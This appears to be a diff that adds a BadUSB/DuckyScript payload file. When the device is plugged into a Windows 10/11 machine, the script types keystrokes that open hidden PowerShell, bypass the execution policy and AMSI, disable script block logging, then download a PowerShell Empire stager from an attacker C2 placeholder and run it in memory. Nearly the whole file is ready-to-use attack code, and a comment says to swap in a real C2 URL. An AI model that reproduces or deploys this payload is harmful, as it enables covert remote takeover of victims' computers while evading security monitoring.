@@ -1,0 +1,57 @@
+REM ==========================================
+REM Title: PowerShell Empire Stager
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Downloads and executes a
+REM   PowerShell Empire stager payload from a
+REM   remote C2 server. Bypasses execution
+REM   policy and AMSI for payload delivery.
+REM Category: Execution / Command & Control
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+REM Launch hidden PowerShell with bypass
+STRING powershell -W Hidden -NoProfile -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM AMSI bypass to avoid detection
+STRING $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+ENTER
+DELAY 400
+STRING $f=$a.GetField('amsiInitFailed','NonPublic,Static')
+ENTER
+DELAY 400
+STRING $f.SetValue($null,$true)
+ENTER
+DELAY 400
+REM Disable script block logging
+STRING Set-ItemProperty -Path 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0 -Force 2>$null
+ENTER
+DELAY 400
+REM Set TLS 1.2 for HTTPS connections
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+ENTER
+DELAY 350
+REM Download Empire stager (replace URL with actual C2)
+STRING $url = 'https://ATTACKER_C2/empire/stager.ps1'
+ENTER
+DELAY 350
+STRING $wc = New-Object System.Net.WebClient
+ENTER
+DELAY 350
+STRING $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+ENTER
+DELAY 350
+STRING $stager = $wc.DownloadString($url)
+ENTER
+DELAY 350
+REM Execute stager in memory (fileless)
+STRING IEX($stager)
+ENTER
+DELAY 500
+REM The stager will beacon back to C2 server
+REM and establish persistent agent connection
+REM Close visible windows
+DELAY 1000
+ALT F4
